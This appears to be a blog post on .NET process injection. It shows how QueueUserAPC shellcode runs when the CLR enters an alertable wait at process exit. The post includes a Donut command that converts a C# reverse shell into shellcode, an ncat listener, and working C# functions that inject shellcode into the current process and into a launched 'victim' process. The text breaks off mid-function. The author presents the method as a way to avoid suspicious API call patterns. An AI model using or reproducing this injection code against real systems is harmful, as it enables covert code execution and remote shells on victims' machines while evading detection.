&lt;p&gt;What if there exists a way, in the realm of .Net Applications, where the thread is set to alertable &lt;em&gt;always&lt;/em&gt;, not by us, but by the &lt;code&gt;Common Language Runtime(CLR)&lt;/code&gt;?&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#clr-is-our-friend"&gt;
  &lt;/a&gt;
  CLR is Our Friend
&lt;/h1&gt;

&lt;p&gt;When we compile a .Net code, it is compiled into Microsoft Intermediate Language (MSIL) code. This is in the format of a &lt;code&gt;.exe&lt;/code&gt; or a &lt;code&gt;.dll&lt;/code&gt;. However these PE files do not contain the machine instructions. A common term for them is &lt;code&gt;Managed Code&lt;/code&gt;. They are machine independant. As long as you have the right .Net Framework installed, you are good to go.&lt;/p&gt;

&lt;p&gt;The  &lt;code&gt;CLR Loader&lt;/code&gt; loads this &lt;code&gt;Managed Code&lt;/code&gt; and sends the instructions into the &lt;code&gt;Just-in-time&lt;/code&gt; compiler which converts the MSIL code at runtime to machine code which is executed by the CPU.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rGpNGQZF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126520609-c92dfc27-9af6-4604-878e-e471db60e785.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rGpNGQZF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126520609-c92dfc27-9af6-4604-878e-e471db60e785.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Interestingly enough, The image above shows that the CLR ultimately handles the threading support as well. &lt;code&gt;Threads&lt;/code&gt; in .NET are handled by the CLR for you and it might call one of the alertable methods listed above.&lt;/p&gt;

&lt;p&gt;A statement in C# such as,&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;will eventually be compiled by the JIT and call one of the alertable methods, &lt;code&gt;SleepEX(..)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The thread is now lying dormant, sleeping. Unless, its APC queue has some function that it needs to execute.&lt;/p&gt;

&lt;p&gt;The interesting part is, we don't even need our target executable to be calling &lt;code&gt;Thread.Sleep&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;This amazing &lt;a href="https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb"&gt;article and research by Dwight Hohnstein&lt;/a&gt;, shows that&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Due to the nature of the .NET compiled language runtime, user asynchronous procedure calls (APCs) are processed upon the exit of any .NET assembly without manually triggering an alertable state from managed code.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It shows that the CLR always calls &lt;code&gt;WaitForMultipleObjectsEx&lt;/code&gt; when ever the program exits!&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#what-this-means-for-us"&gt;
  &lt;/a&gt;
  What this means for us?
&lt;/h1&gt;

&lt;p&gt;This means that ALL .NET executables, even if they do not have any alertable calls, are loaded by the CLR and upon exit of the .Net executable, the CLR will call an alertable method.&lt;/p&gt;

&lt;p&gt;This means we can easily inject our shellcode in the form of MSIL code, into .net executables, without overly using the suspicious chain of API calls, and eventually, when the target program exits, the thread would be set to an alertable state as the CLR calls &lt;code&gt;WaitForMultipleObjectsEx&lt;/code&gt;, and our shellcode executes.&lt;/p&gt;

&lt;p&gt;This inspired me to write a POC to see for myself if it really works.&lt;/p&gt;

&lt;p&gt;I am going to omit some code in these examples, so as to make it shorter.&lt;/p&gt;

&lt;p&gt;The full source code is in the &lt;a href="https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/DotNetQueueUserAPCInjectionOnExit"&gt;repository&lt;/a&gt;.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#lets-first-create-our-shellcode"&gt;
  &lt;/a&gt;
  Let's first create our ShellCode
&lt;/h1&gt;

&lt;p&gt;The shellcode is going to be a simple reverse shell written in C#. Its a reverse shell that connects to port &lt;code&gt;3333&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Code can be found &lt;a href="https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ShellCode"&gt;here&lt;/a&gt;;&lt;/p&gt;

&lt;p&gt;I then used &lt;a href="https://github.com/TheWover/donut"&gt;Donut&lt;/a&gt; to compile our MSIL binary into a shellcode.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;D:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\R&lt;/span&gt;azali&lt;span class="se"&gt;\S&lt;/span&gt;ource&lt;span class="se"&gt;\R&lt;/span&gt;epos&lt;span class="se"&gt;\d&lt;/span&gt;onut&amp;gt;donut.exe &lt;span class="nt"&gt;-a2&lt;/span&gt; &lt;span class="nt"&gt;-f2&lt;/span&gt; &lt;span class="nt"&gt;-cShellCode&lt;/span&gt;.Program &lt;span class="nt"&gt;-mMain&lt;/span&gt; &lt;span class="nt"&gt;-o&lt;/span&gt; &lt;span class="s2"&gt;"myshellcode.txt"&lt;/span&gt; &lt;span class="s2"&gt;"D:&lt;/span&gt;&lt;span class="se"&gt;\U&lt;/span&gt;&lt;span class="s2"&gt;sers&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;azali&lt;/span&gt;&lt;span class="se"&gt;\S&lt;/span&gt;&lt;span class="s2"&gt;ource&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;epos&lt;/span&gt;&lt;span class="se"&gt;\P&lt;/span&gt;&lt;span class="s2"&gt;rocessInjector.NET&lt;/span&gt;&lt;span class="se"&gt;\P&lt;/span&gt;&lt;span class="s2"&gt;rocessInjector&lt;/span&gt;&lt;span class="se"&gt;\S&lt;/span&gt;&lt;span class="s2"&gt;hellCode&lt;/span&gt;&lt;span class="se"&gt;\b&lt;/span&gt;&lt;span class="s2"&gt;in&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;elease&lt;/span&gt;&lt;span class="se"&gt;\s&lt;/span&gt;&lt;span class="s2"&gt;hellcode.exe"&lt;/span&gt;

  &lt;span class="o"&gt;[&lt;/span&gt; Donut shellcode generator v0.9.3
  &lt;span class="o"&gt;[&lt;/span&gt; Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; 2019 TheWover, Odzhan

  &lt;span class="o"&gt;[&lt;/span&gt; Instance &lt;span class="nb"&gt;type&lt;/span&gt; : Embedded
  &lt;span class="o"&gt;[&lt;/span&gt; Module file   : &lt;span class="s2"&gt;"D:&lt;/span&gt;&lt;span class="se"&gt;\U&lt;/span&gt;&lt;span class="s2"&gt;sers&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;azali&lt;/span&gt;&lt;span class="se"&gt;\S&lt;/span&gt;&lt;span class="s2"&gt;ource&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;epos&lt;/span&gt;&lt;span class="se"&gt;\P&lt;/span&gt;&lt;span class="s2"&gt;rocessInjector.NET&lt;/span&gt;&lt;span class="se"&gt;\P&lt;/span&gt;&lt;span class="s2"&gt;rocessInjector&lt;/span&gt;&lt;span class="se"&gt;\S&lt;/span&gt;&lt;span class="s2"&gt;hellCode&lt;/span&gt;&lt;span class="se"&gt;\b&lt;/span&gt;&lt;span class="s2"&gt;in&lt;/span&gt;&lt;span class="se"&gt;\R&lt;/span&gt;&lt;span class="s2"&gt;elease&lt;/span&gt;&lt;span class="se"&gt;\s&lt;/span&gt;&lt;span class="s2"&gt;hellcode.exe"&lt;/span&gt;
  &lt;span class="o"&gt;[&lt;/span&gt; Entropy       : Random names + Encryption
  &lt;span class="o"&gt;[&lt;/span&gt; File &lt;span class="nb"&gt;type&lt;/span&gt;     : .NET EXE
  &lt;span class="o"&gt;[&lt;/span&gt; Target CPU    : amd64
  &lt;span class="o"&gt;[&lt;/span&gt; AMSI/WDLP     : &lt;span class="k"&gt;continue&lt;/span&gt;
  &lt;span class="o"&gt;[&lt;/span&gt; Shellcode     : &lt;span class="s2"&gt;"myshellcode.txt"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;-a2&lt;/code&gt; specifies to compile the shellcode to &lt;code&gt;amd64&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-f2&lt;/code&gt; specifies to encode it to &lt;code&gt;base64&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-c&lt;/code&gt; specifies the &lt;code&gt;&amp;lt;namespace&amp;gt;.&amp;lt;class name&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-m&lt;/code&gt; specifies the &lt;code&gt;Method name&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-o&lt;/code&gt; specifies the &lt;code&gt;output filename&lt;/code&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#lets-next-set-up-our-listener"&gt;
  &lt;/a&gt;
  Lets next set up our listener
&lt;/h1&gt;

&lt;p&gt;I will be using netcat for all examples below, to listen for a connection and interact with the shell.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\R&lt;/span&gt;azali&lt;span class="se"&gt;\D&lt;/span&gt;esktop&lt;span class="se"&gt;\n&lt;/span&gt;cat-portable-5.59BETA1&amp;gt;ncat &lt;span class="nt"&gt;-l&lt;/span&gt; 3333

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#self-injection"&gt;
  &lt;/a&gt;
  Self Injection
&lt;/h1&gt;

&lt;p&gt;This example demonstrates that after injecting the shellcode within the calling process, when the process exits, the shellcode gets called. At no part of the code did we put any alertable calls.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;SelfInject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;VirtualAlloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x00001000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;Marshal&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nf"&gt;QueueUserAPC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nf"&gt;GetCurrentThread&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Goodbye"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Henceforth, it confirms that when a .NET process exits, the CLR did call an alertable method on behalf of me, which invokes the shellcode, and we get a shell.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fkTy3132--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126809811-c4b89f79-7cb1-4a37-9c00-576622a37391.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fkTy3132--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126809811-c4b89f79-7cb1-4a37-9c00-576622a37391.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#injection-using-race-condition"&gt;
  &lt;/a&gt;
  Injection using Race Condition
&lt;/h1&gt;

&lt;p&gt;As stated in the documentattion of &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc"&gt;QueueUserAPC&lt;/a&gt;, if we queue an APC before the main thread starts, the main thread would first prioritize running all the APC(s) in the queue before running the main code.&lt;/p&gt;

&lt;p&gt;While experimenting, I found that a &lt;code&gt;Console Application&lt;/code&gt; is sometimes too quick to perform a race condition on, as the CLR seems to load and start the main thread even before I finish writing my APC into the queue. &lt;/p&gt;

&lt;p&gt;Thus, I tried injecting the APC into a &lt;code&gt;Windows Form&lt;/code&gt;, which takes a longer time for the UI Thread to be set up by the CLR, allowing me to quickly inject my APC before it begins. What we expect to observe is to achieve a shell without even exiting the .NET process, as the shell is achieved even before the UI Thread(main thread) starts. Since the shell is being run by the UI Thread, we won't see the &lt;code&gt;Windows Form&lt;/code&gt; as the UI Thread is busy with my shell.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;InjectRunningProcessUsingRaceCondition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;victimProcessPath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;STARTUPINFO&lt;/span&gt; &lt;span class="n"&gt;startupinfo&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;STARTUPINFO&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;PROCESS_INFORMATION&lt;/span&gt; &lt;span class="n"&gt;processInformation&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;PROCESS_INFORMATION&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nf"&gt;CreateProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;victimProcessPath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;ref&lt;/span&gt; &lt;span class="n"&gt;startupinfo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;ref&lt;/span&gt; &lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;VirtualAllocEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IntPtr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Zero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x00001000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;bytesWritten&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IntPtr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Zero&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="nf"&gt;WriteProcessMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;bytesWritten&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;GetProcessById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dwProcessId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ProcessThread&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Threads&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;threadHandle&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;OpenThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0x0010&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nf"&gt;VirtualProtectEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nf"&gt;QueueUserAPC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Henceforth, it confirms that it is possible to race against the Main thread, and inject our APC before it starts, which results in the Main thread executing our APC before the actual code.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MHady1QI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126812066-6195dbd6-e17a-4617-bbb2-8b3fd0e7c147.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MHady1QI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126812066-6195dbd6-e17a-4617-bbb2-8b3fd0e7c147.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#injecting-into-any-running-net-process"&gt;
  &lt;/a&gt;
  Injecting into any Running .NET Process
&lt;/h1&gt;

&lt;p&gt;As confirmed in our first example, our APC would get executed after the program exits.&lt;/p&gt;

&lt;p&gt;I simulated it by simply letting my &lt;code&gt;Windows Form&lt;/code&gt; boot up first, giving it a headstart by pausing using &lt;code&gt;Thread.Sleep&lt;/code&gt; in my injector code, after which I perform the injection.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;InjectRunningProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;victimProcessPath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;STARTUPINFO&lt;/span&gt; &lt;span class="n"&gt;startupinfo&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;STARTUPINFO&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;PROCESS_INFORMATION&lt;/span&gt; &lt;span class="n"&gt;processInformation&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;PROCESS_INFORMATION&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nf"&gt;CreateProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;victimProcessPath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;ref&lt;/span&gt; &lt;span class="n"&gt;startupinfo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;ref&lt;/span&gt; &lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;//Thread sleep is used here to give the victim process time to load and run its main thread.&lt;/span&gt;
    &lt;span class="c1"&gt;//We do not want to race against it.&lt;/span&gt;
    &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;VirtualAllocEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IntPtr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Zero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x00001000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;bytesWritten&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IntPtr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Zero&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

